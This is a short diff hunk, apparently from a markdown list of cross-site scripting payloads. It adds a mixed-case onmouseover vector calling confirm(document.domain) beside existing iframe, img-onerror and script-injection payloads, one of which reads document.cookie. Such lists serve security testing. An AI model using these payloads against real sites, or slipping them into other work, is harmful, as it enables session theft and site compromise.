@@ -66,6 +66,8 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 "><img src=x onerror="alert(1)">
 
 }}})</script><script>alert(1)</script>
+
+<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
 ```
 
 svg file upload
